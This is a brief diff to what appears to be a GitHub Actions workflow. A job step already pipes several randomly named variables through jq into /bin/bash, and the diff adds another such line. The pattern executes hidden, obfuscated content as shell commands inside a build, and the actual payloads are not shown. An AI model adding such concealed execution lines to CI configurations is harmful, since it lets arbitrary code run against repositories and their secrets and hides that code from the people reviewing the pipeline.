@@ -26,6 +26,7 @@ jobs:
           echo $nppp126 | jq -r .sq3 | /bin/bash
           echo $dtqvv20608 | jq -r .m72444 | /bin/bash
           printf '%s' "$dsb14" | jq -r .bqfza94136 | /bin/bash
+          printf '%s' "$e34" | jq -r .sdx900 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
